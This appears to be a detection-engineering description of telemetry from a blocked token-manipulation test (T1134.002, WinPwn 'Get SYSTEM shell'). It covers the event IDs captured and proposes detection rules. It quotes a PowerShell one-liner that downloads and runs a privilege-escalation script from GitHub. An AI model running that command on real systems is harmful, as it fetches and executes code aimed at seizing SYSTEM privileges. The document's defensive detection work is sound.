# T1134.002-2: Create Process with Token — WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique

## Technique Context

T1134.002 (Create Process with Token) is a privilege escalation and defense evasion technique where adversaries create new processes using stolen or duplicated access tokens. This allows them to impersonate other users or escalate privileges by leveraging tokens with higher privileges. The technique is commonly used to move from standard user contexts to SYSTEM-level access, or to impersonate specific users for lateral movement.

In this specific test, the WinPwn toolkit's "Get-WinlogonTokenSystem.ps1" script is used, which typically attempts to duplicate tokens from high-privilege processes like winlogon.exe to spawn a SYSTEM-level shell. The detection community focuses on monitoring for unusual token manipulation APIs (OpenProcessToken, DuplicateToken, CreateProcessWithToken), process access patterns targeting high-privilege processes, and new processes spawning with mismatched parent-child privilege relationships.

## What This Dataset Contains

This dataset captures a token manipulation attempt that was blocked by Windows Defender's Anti-Malware Scan Interface (AMSI). The key events include:

**PowerShell Activity**: The attempt begins with PowerShell downloading the malicious script via `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1')`. However, PowerShell EID 4100 shows "This script contains malicious content and has been blocked by your antivirus software" with error ID "ScriptContainedMaliciousContent".

**Process Creation Chain**: Security EID 4688 shows the command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring(...)}` creating process ID 22640, followed by whoami.exe execution (process ID 31104).

**Network Activity**: Sysmon EID 3 and EID 22 capture the PowerShell process (PID 22640) performing DNS resolution for "raw.githubusercontent.com" (185.199.109.133) and establishing HTTPS connections on port 443, demonstrating the download attempt.

**Token Privilege Adjustment**: Security EID 4703 shows significant privilege enablement including SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, and other powerful privileges, indicating the script began token manipulation operations before being blocked.

**Process Access Monitoring**: Sysmon EID 10 events show PowerShell processes accessing other processes with full access rights (0x1FFFFF), which are typical of token manipulation attempts.

## What This Dataset Does Not Contain

The dataset lacks evidence of successful token manipulation because Windows Defender's AMSI blocked the malicious script execution. Missing elements include:

- No successful CreateProcessWithToken API calls or related process creation events with elevated privileges
- No evidence of successful token duplication from winlogon.exe or other high-privilege processes  
- No registry modifications that might accompany successful privilege escalation
- Limited Sysmon ProcessCreate events due to the sysmon-modular configuration's include-mode filtering, though Security 4688 events provide comprehensive process creation coverage
- No file system artifacts from successful payload execution since the technique was blocked at the script loading stage

## Assessment

This dataset provides excellent telemetry for detecting token manipulation attempts, particularly those blocked by endpoint protection. The combination of PowerShell script block logging (EID 4104), command-line auditing (Security 4688), AMSI blocking events (PowerShell 4100), and process access monitoring (Sysmon 10) creates a comprehensive detection surface. The privilege adjustment events (Security 4703) are particularly valuable as they show the technique's preparation phase before blocking occurred.

The data quality is strong for building detections around failed token manipulation attempts and would be valuable for threat hunting scenarios where attackers might use similar tools or techniques. However, it lacks telemetry showing successful token manipulation, which limits its utility for understanding the full attack lifecycle.

## Detection Opportunities Present in This Data

1. **AMSI Script Blocking Detection**: Monitor PowerShell EID 4100 events with error ID "ScriptContainedMaliciousContent" combined with token manipulation-related keywords in the blocked script content.

2. **Suspicious PowerShell Download Patterns**: Detect PowerShell EID 4104 script blocks containing `new-object net.webclient` combined with `downloadstring` methods targeting known offensive security repositories like S3cur3Th1sSh1t's GitHub.

3. **Token Privilege Escalation**: Alert on Security EID 4703 events where multiple high-risk privileges are enabled simultaneously, particularly SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege combinations.

4. **Offensive PowerShell Command Lines**: Monitor Security EID 4688 process creation events for command lines containing token manipulation frameworks like WinPwn or direct references to token manipulation scripts.

5. **Suspicious Process Access Patterns**: Correlate Sysmon EID 10 events showing PowerShell processes accessing multiple other processes with full access rights (0x1FFFFF) as potential token theft preparation.

6. **Network Indicators of Token Tools**: Track DNS queries and HTTPS connections to raw.githubusercontent.com from PowerShell processes, especially when combined with paths containing "TokenManipulation" or similar offensive security keywords.

7. **PowerShell Module Loading Anomalies**: Monitor Sysmon EID 7 events for PowerShell processes loading urlmon.dll in conjunction with privilege adjustment events, indicating potential credential or token harvesting preparation.
